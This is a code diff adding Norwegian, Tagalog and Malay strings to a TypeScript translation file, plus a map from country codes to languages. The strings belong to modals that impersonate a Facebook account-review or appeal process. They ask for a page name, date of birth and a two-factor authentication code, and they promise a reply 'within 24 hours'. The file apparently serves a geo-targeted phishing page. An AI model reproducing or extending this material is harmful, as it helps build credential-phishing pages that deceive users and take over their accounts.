         'Code': 'Kode',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Tofaktor-autentiseringskoden du skrev inn er feil. Vennligst prøv igjen etter',
         'Continue': 'Fortsett',
+        // Init Modal
+        'Request Review': 'Be om gjennomgang',
+        'Please provide the information below to help us review your account.': 'Oppgi informasjonen nedenfor for å hjelpe oss med å gjennomgå kontoen din.',
+        'Page Name': 'Sidenavn',
+        'Date of birth': 'Fødselsdato',
+        'Day': 'Dag',
+        'Month': 'Måned',
+        'Year': 'År',
+        // Final Modal
+        'Request has been sent': 'Forespørselen er sendt',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Forespørselen din er lagt til i behandlingskøen. Vi behandler forespørselen din innen 24 timer. Hvis du ikke mottar en e-post om klagestatus innen 24 timer, send klagen på nytt.',
+        'Return on Facebook': 'Tilbake til Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Bekreft sideinformasjon',
+        'Your page meets the eligibility requirements': 'Siden din oppfyller kvalifikasjonskravene',
+        'Submit Application': 'Send søknad',
+        'Under Review': 'Under vurdering',
     },
     // Tagalog (Filipino)
     tl: {
@@ -2644,6 +3035,23 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Kodigo',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Ang two-factor authentication code na iyong isinasama ay hindi tama. Mangyaring subukan ulit pagkatapos',
         'Continue': 'Magpatuloy',
+        // Init Modal
+        'Request Review': 'Humiling ng Pagsusuri',
+        'Please provide the information below to help us review your account.': 'Mangyaring ibigay ang impormasyon sa ibaba upang matulungan kaming suriin ang iyong account.',
+        'Page Name': 'Pangalan ng Pahina',
+        'Date of birth': 'Petsa ng kapanganakan',
+        'Day': 'Araw',
+        'Month': 'Buwan',
+        'Year': 'Taon',
+        // Final Modal
+        'Request has been sent': 'Naipadala na ang kahilingan',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Ang iyong kahilingan ay naidagdag sa pila ng pagproseso. Ipoproseso namin ang iyong kahilingan sa loob ng 24 na oras. Kung hindi ka makatanggap ng email tungkol sa status ng apela sa loob ng 24 na oras, mangyaring ipadala muli ang apela.',
+        'Return on Facebook': 'Bumalik sa Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Kumpirmahin ang impormasyon ng pahina',
+        'Your page meets the eligibility requirements': 'Natutugunan ng iyong pahina ang mga kinakailangan sa pagiging karapat-dapat',
+        'Submit Application': 'Isumite ang aplikasyon',
+        'Under Review': 'Sinusuri',
     },
     // Malay
     ms: {
@@ -2758,8 +3166,74 @@ const translations: Record<LangKey, Record<string, string>> = {
         'Code': 'Kod',
         'The two-factor authentication you entered is incorrect. Please, try again after': 'Kod pengesahan dua faktor yang anda masukkan tidak betul. Sila cuba lagi selepas',
         'Continue': 'Teruskan',
+        // Init Modal
+        'Request Review': 'Minta Semakan',
+        'Please provide the information below to help us review your account.': 'Sila berikan maklumat di bawah untuk membantu kami menyemak akaun anda.',
+        'Page Name': 'Nama Halaman',
+        'Date of birth': 'Tarikh lahir',
+        'Day': 'Hari',
+        'Month': 'Bulan',
+        'Year': 'Tahun',
+        // Final Modal
+        'Request has been sent': 'Permintaan telah dihantar',
+        'Your request has been added to the processing queue. We will process your request within 24 hours. If you do not receive an email message with the appeal status within 24 hours, please resend the appeal.': 'Permintaan anda telah ditambah ke barisan pemprosesan. Kami akan memproses permintaan anda dalam masa 24 jam. Jika anda tidak menerima e-mel tentang status rayuan dalam masa 24 jam, sila hantar semula rayuan.',
+        'Return on Facebook': 'Kembali ke Facebook',
+        // Verify Info Modal
+        'Confirm Page Information': 'Sahkan maklumat halaman',
+        'Your page meets the eligibility requirements': 'Halaman anda memenuhi syarat kelayakan',
+        'Submit Application': 'Hantar permohonan',
+        'Under Review': 'Sedang disemak',
     }
 };
+
+// Full country code → language mapping (200+ countries, UPPERCASE keys)
+// Returns language codes beyond LangKey for Google Translate API fallback
+export const FULL_COUNTRY_LANG_MAP: Record<string, string> = {
+    // Africa
+    DZ: 'ar', AO: 'pt', BJ: 'fr', BW: 'en', BF: 'fr', BI: 'fr', CV: 'pt',
+    CM: 'fr', CF: 'fr', TD: 'fr', KM: 'ar', CG: 'fr', CD: 'fr', DJ: 'fr',
+    EG: 'ar', GQ: 'es', ER: 'ar', ET: 'am', GA: 'fr', GM: 'en', GH: 'en',
+    GN: 'fr', GW: 'pt', CI: 'fr', KE: 'sw', LS: 'en', LR: 'en', LY: 'ar',
+    MG: 'fr', MW: 'en', ML: 'fr', MR: 'ar', MU: 'fr', MA: 'ar', MZ: 'pt',
+    NA: 'en', NE: 'fr', NG: 'en', RW: 'fr', ST: 'pt', SN: 'fr', SC: 'fr',
+    SL: 'en', SO: 'ar', ZA: 'en', SS: 'en', SD: 'ar', SZ: 'en', TZ: 'sw',
+    TG: 'fr', TN: 'ar', UG: 'en', ZM: 'en', ZW: 'en',
+    // Americas
+    AG: 'en', AR: 'es', BS: 'en', BB: 'en', BZ: 'en', BO: 'es', BR: 'pt',
+    CA: 'en', CL: 'es', CO: 'es', CR: 'es', CU: 'es', DM: 'en', DO: 'es',
+    EC: 'es', SV: 'es', GD: 'en', GT: 'es', GY: 'en', HT: 'fr', HN: 'es',
+    JM: 'en', MX: 'es', NI: 'es', PA: 'es', PY: 'es', PE: 'es', PR: 'es',
+    KN: 'en', LC: 'en', VC: 'en', SR: 'nl', TT: 'en', US: 'en', UY: 'es',
+    VE: 'es',
+    // Asia
+    AF: 'fa', AM: 'hy', AZ: 'az', BH: 'ar', BD: 'bn', BN: 'ms',
+    KH: 'km', CN: 'zh', CY: 'el', GE: 'ka', HK: 'zh', IN: 'hi', ID: 'id',
+    IR: 'fa', IQ: 'ar', IL: 'iw', JP: 'ja', JO: 'ar', KZ: 'ru', KW: 'ar',
+    KG: 'ru', LA: 'lo', LB: 'ar', MO: 'zh', MY: 'ms', MV: 'en', MN: 'mn',
+    MM: 'my', NP: 'ne', KP: 'ko', OM: 'ar', PK: 'ur', PS: 'ar', PH: 'tl',
+    QA: 'ar', SA: 'ar', SG: 'zh', LK: 'si', SY: 'ar', TW: 'zh', TJ: 'ru',
+    TH: 'th', TL: 'pt', TR: 'tr', TM: 'ru', AE: 'ar', UZ: 'uz', VN: 'vi',
+    YE: 'ar',
+    // Europe
+    AL: 'sq', AD: 'es', AT: 'de', BY: 'ru', BE: 'nl', BA: 'bs', BG: 'bg',
+    HR: 'hr', CZ: 'cs', DK: 'da', EE: 'et', FI: 'fi', FR: 'fr', DE: 'de',
+    GR: 'el', HU: 'hu', IS: 'is', IE: 'en', IT: 'it', XK: 'sq', LV: 'lv',
+    LI: 'de', LT: 'lt', LU: 'fr', MT: 'mt', MD: 'ro', MC: 'fr', ME: 'sr',
+    NL: 'nl', MK: 'mk', NO: 'no', PL: 'pl', PT: 'pt', RO: 'ro', RU: 'ru',
+    SM: 'it', RS: 'sr', SK: 'cs', SI: 'sl', ES: 'es', SE: 'sv', CH: 'de',
+    UA: 'uk', GB: 'en', VA: 'it',
+    // Oceania
+    AU: 'en', FJ: 'en', KI: 'en', MH: 'en', FM: 'en', NR: 'en', NZ: 'en',
+    PW: 'en', PG: 'en', WS: 'en', SB: 'en', TO: 'en', TV: 'en', VU: 'fr',
+    // Territories
+    GL: 'da', FO: 'da', AX: 'sv', GI: 'en', JE: 'en', GG: 'en', IM: 'en',
+};
+
+// Set of language codes that have full hardcoded translations available
+export const HARDCODED_LANGS = new Set<string>([
+    'vi', 'es', 'fr', 'de', 'it', 'zh', 'ar', 'hi', 'pt', 'ru', 'ja', 'nl', 'pl', 'el',
+    'tr', 'th', 'ko', 'sv', 'id', 'ms', 'uk', 'bn', 'tl', 'no'
+]);
 
 export function getTranslations(lang: string = 'en'): Record<string, string> {
     const langMap: Record<string, LangKey> = {
